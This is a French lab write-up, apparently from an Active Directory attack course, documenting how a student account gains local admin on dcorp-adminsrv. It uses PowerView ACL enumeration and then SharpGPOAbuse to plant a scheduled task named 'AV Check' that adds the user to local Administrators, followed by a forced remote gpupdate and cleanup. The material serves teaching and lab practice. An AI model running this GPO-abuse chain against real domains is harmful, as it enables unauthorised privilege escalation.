---
lo: 6
statut: validé
---
# LO6 - Derivative local admin (via abus GPO)

> [!info] Objectif
> Obtenir de l'**admin local dérivé** sur une machine du domaine en abusant d'un droit d'ACL sur une GPO (via BloodHound → SharpGPOAbuse). Débloque le sous-arbre LO7 sur **dcorp-adminsrv** (F12/F13/F14/F15).

> [!abstract] Pourquoi · Chaînage
> `studentx` **n'est admin local nulle part** au départ. Il est membre de `dcorp\RDPUsers`, qui a **GenericAll + GenericWrite** sur la GPO `Applocker`. Cette GPO frappe l'OU `Applocked` qui contient **`dcorp-adminsrv`**. En ajoutant une Immediate Task à la GPO → SYSTEM sur adminsrv → ajout de studentx aux Administrators locaux → PSSession admin.
> **Prérequis → débloque** : BloodHound / PowerView (énum ACL sur GPO) → SharpGPOAbuse → dcorp-adminsrv admin local → [[F12 - Source des creds tâches planifiées]] · [[F13 - NTLM-clair de srvadmin]] · [[F14 - NTLM de websvc]] · [[F15 - NTLM de appadmin]].

> [!warning] Contexte de CE pod
> - **`studentx = student426`** (change selon ton pod), password fourni par le portail.
> - Windows FW student VM bloque tout inbound → **les walkthroughs GPOddity (NTLM relay + rogue SMB, listener nc) ne marchent pas depuis la student VM**. On passe par **SharpGPOAbuse** (100% LDAP/SMB sortant, aucun listener).
> - Ne pas être en session svcadmin OPtH (LO07) au moment du LO06 : `klist purge` d'abord pour éviter pollution. Le TGT svcadmin se réinjecte plus tard.

## Chaîne d'exploitation (validée)

### 1. Énum ACL — trouver une GPO writeable par mon principal
```powershell
. C:\AD\Tools\PowerView.ps1
$me = (Get-DomainUser $env:USERNAME).objectsid
$mygroups = (Get-DomainGroup -MemberIdentity $env:USERNAME).objectsid
$targets = @($me) + @($mygroups)

Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
  ? { $_.SecurityIdentifier -in $targets -and $_.ActiveDirectoryRights -match "WriteDacl|GenericAll|GenericWrite|WriteOwner|WriteProperty" } |
  select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```
Sortie pod : GPO GUID `{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}` = **`Applocker`**, principal **`dcorp\RDPUsers`**, droits GenericAll + GenericWrite.

Équivalent BloodHound (Raw Query) :
```cypher
MATCH p=shortestPath((u:User {name:"STUDENT426@DOLLARCORP.MONEYCORP.LOCAL"})-[:MemberOf|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns*1..]->(g:GPO)) RETURN p
```

### 2. Résoudre GPO → OU → machines cibles
```powershell
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}" | select displayname, gpcfilesyspath
Get-DomainOU | ? { $_.gplink -match "0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E" } | select name, distinguishedname
Get-DomainComputer -SearchBase "OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local" | select samaccountname, dnshostname
```
→ **OU `Applocked` → `dcorp-adminsrv`** (unique machine).

### 3. Snapshot GPO AVANT (pour F09 diff attribut)
```powershell
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}" |
  select displayname, gPCMachineExtensionNames, gPCUserExtensionNames, versionNumber, gpcfilesyspath
```

### 4. SharpGPOAbuse — Immediate Task qui ajoute studentx aux Admins locaux
```powershell
cd C:\AD\Tools
.\SharpGPOAbuse.exe --AddComputerTask `
  --TaskName "AV Check" `
  --Author "NT AUTHORITY\SYSTEM" `
  --Command "cmd.exe" `
  --Arguments "/c net localgroup Administrators dcorp\student426 /add" `
  --GPOName "Applocker"
```
→ dépose `\\dollarcorp.moneycorp.local\SysVol\...\Applocker\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml` + bump attribut LDAP + `versionNumber`.

### 5. Snapshot APRÈS + note l'attribut modifié → réponse F09
```powershell
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}" |
  select displayname, gPCMachineExtensionNames, gPCUserExtensionNames, versionNumber, gpcfilesyspath
```
Attribut qui bouge = **`gPCMachineExtensionNames`** (nouveaux CSE GUIDs pour Scheduled Tasks/Preferences). Cf [[F09 - Attribut Group Policy modifié]].

### 6. Forcer gpupdate distant (non-admin OK via WMI)
```powershell
Invoke-WmiMethod -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -Class Win32_Process -Name Create -ArgumentList "cmd /c gpupdate /force"
```
`ReturnValue: 0` = accepté. Sans ça, attendre le cycle naturel (~90 min ± 30).

### 7. Preuve : PSSession admin local
```powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
whoami /groups | Select-String "Administrators"
ls C:\Users     # → Administrator, appadmin, srvadmin, websvc, student426 → jackpot pour F13/F14/F15
```

### 8. Cleanup (depuis student VM, PAS depuis adminsrv)
```powershell
cd C:\AD\Tools
.\SharpGPOAbuse.exe --RemoveComputerTask --TaskName "AV Check" --GPOName "Applocker"
```

## Pièges rencontrés

> [!failure]- Journal des murs (et le fix qui a marché)
> - **GPOddity** (walkthrough gitbook `dev-angelist`) → NTLM relay + rogue SMB share + Invoke-WebRequest coerce. Callback jamais reçu sur le nc listener de la student VM → **FW inbound student VM** (même mur qu'en LO07). Fallback → SharpGPOAbuse (aucun inbound).
> - `SharpGPOAbuse --RemoveComputerTask` lancé DEPUIS la PSSession dcorp-adminsrv → `not recognized`. L'exe n'existe **que** sur la student VM. Faire le cleanup depuis la student VM.
> - Session PS polluée par un TGT svcadmin (LO07 déjà fait avant) → `klist purge` avant l'énum pour rester en `studentx`.
> - Attribut discriminant : `versionNumber` bumpe **toujours** — la vraie réponse F09 = **`gPCMachineExtensionNames`** (nouvel CSE GUID = déclencheur re-processing client).

## Fiches liées

- [[Cheatsheet - BloodHound SharpHound]]
- [[Cheatsheet - GPO et OU]]
- [[Cheatsheet - ACL et droits AD]]
- [[F09 - Attribut Group Policy modifié]]
- [[LO02 - OUs et GPOs]]
- [[LO07 - Session DA et escalade]] (débloqué par ce LO)

## Voir aussi
[[Journal - Index]] · [[Attack flow]]
